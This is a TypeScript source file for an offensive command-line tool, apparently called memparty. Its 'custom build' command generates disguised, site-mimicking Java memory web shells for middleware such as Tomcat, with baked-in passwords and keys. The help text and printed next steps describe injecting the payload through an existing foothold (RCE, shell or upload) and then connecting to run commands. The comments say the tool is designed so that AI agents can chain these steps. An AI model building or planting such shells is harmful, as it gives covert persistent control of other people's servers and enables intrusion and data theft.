import { Command } from "commander";

import { createClient, logInfo, reportError, type GlobalOptions } from "../cli-context.js";
import { randomString } from "../connect/crypto.js";
import { logOp } from "../core/oplog.js";
import { loadProfile } from "../core/site-profile.js";
import { buildCustomMemshell } from "../custom/build.js";

interface CustomBuildCmdOptions extends GlobalOptions {
  profile?: string;
  server?: string;
  type?: string;
  pass?: string;
  key?: string;
  urlPattern?: string;
  packer?: string;
  jdk?: string;
  out?: string;
  json?: boolean;
}

/**
 * `memparty custom build` — the agent-friendly one-shot: profile in,
 * injectable mimic memory shell out. The generated credentials and the
 * follow-up connect command are printed (and stored in manifest.json) so an
 * agent can chain the steps without re-deriving anything.
 */
export function registerCustomCommand(program: Command): void {
  program
    .command("custom")
    .description("Custom (mimic) memory shells built from a site profile")
    .addCommand(
      new Command("build")
        .description("profile -> filter class -> MemShellParty Custom -> injectable payload")
        .requiredOption("--profile <name>", "site profile name (see 'memparty profile list')")
        .requiredOption("--server <server>", "target middleware, e.g. Tomcat, TongWeb (see 'memparty config tools')")
        .option("--type <shellType>", "shell type the filter implements", "Filter")
        .option("--pass <pass>", "credential baked into the shell (random if omitted)")
        .option("--key <key>", "crypto key baked into the shell (random if omitted)")
        .option("--url-pattern <pattern>", "injector URL pattern", "/*")
        .option("--packer <packer>", "payload packer", "DefaultBase64")
        .option("--jdk <version>", "target JDK, e.g. java8", "java8")
        .option("--out <dir>", "output directory", undefined)
        .option("--json", "output raw JSON")
        .addHelpText(
          "after",
          `
The full loop (see docs/mimic-memshell-guide.md):
  1. write a site profile            memparty profile init acme --site https://acme.cn
  2. build the shell                 memparty custom build --profile acme --server Tomcat
  3. inject payload-*.txt via your foothold (RCE / existing shell / upload)
  4. connect + exec                  memparty connect -u <url> -t mimic --profile acme ...

Delivery is NOT part of this command — it only builds the payload.
Requires a JDK (javac on PATH) and a MemShellParty backend (--api).
`,
        )
        .action(async (opts: CustomBuildCmdOptions, cmd: Command) => {
          const globals = cmd.optsWithGlobals() as GlobalOptions;
          const fail = (message: string): void => {
            reportError(message, opts.json ? ["--json"] : []);
            process.exitCode = 1;
          };

          let profile;
          try {
            profile = loadProfile(opts.profile!);
          } catch (err) {
            fail(err instanceof Error ? err.message : String(err));
            return;
          }

          // credentials are generated unless given — they are baked into the class
          const pass = opts.pass ?? randomString(10);
          const secret = opts.key ?? randomString(16);
          const outDir = opts.out ?? `${opts.profile}-build`;

          const client = createClient(globals);
          const started = Date.now();
          try {
            const result = await buildCustomMemshell(
              {
                profile,
                server: opts.server!,
                shellType: opts.type,
                pass,
                secret,
                urlPattern: opts.urlPattern,
                packer: opts.packer,
                jdk: opts.jdk,
                outDir,
              },
              client,
            );

            logOp({
              category: "gen",
              action: "custom-build",
              ok: true,
              durationMs: Date.now() - started,
              detail: `${result.fullClassName} -> ${result.injectorClassName} (${result.server}/${result.shellType})`,
              meta: {
                profile: profile.name,
                server: result.server,
                shellType: result.shellType,
                packer: result.packer,
              },
            });

            if (opts.json) {
              const { response: _response, ...summary } = result;
              process.stdout.write(`${JSON.stringify({ ok: true, ...summary }, null, 2)}\n`);
              return;
            }

            logInfo(`filter class:    ${result.fullClassName}`);
            logInfo(
              `injector class:  ${result.injectorClassName} (server=${result.server}, type=${result.shellType})`,
            );
            logInfo(`credentials:     --pass ${result.pass} --key ${result.secret}`);
            logInfo(`cipher:          ${JSON.stringify(result.cipher)}`);
            for (const [name, file] of Object.entries(result.files.payloads)) {
              logInfo(`payload [${name}]: ${file}`);
            }
            logInfo(`manifest:        ${result.files.manifest}`);
            process.stdout.write(
              `\nnext steps:\n` +
                `  1. inject the payload via your foothold (RCE defineClass / existing shell / upload)\n` +
                `  2. memparty connect -u <shell-url> -t mimic --profile ${profile.name} --pass ${result.pass} --key ${result.secret}\n` +
                `  3. memparty exec <host>/mimic --cmd "id"\n`,
            );
          } catch (err) {
            logOp({
              category: "gen",
              action: "custom-build",
              ok: false,
              durationMs: Date.now() - started,
              error: err instanceof Error ? err.message : String(err),
              meta: { profile: profile.name, server: opts.server },
            });
            fail(err instanceof Error ? err.message : String(err));
          }
        }),
    );
}
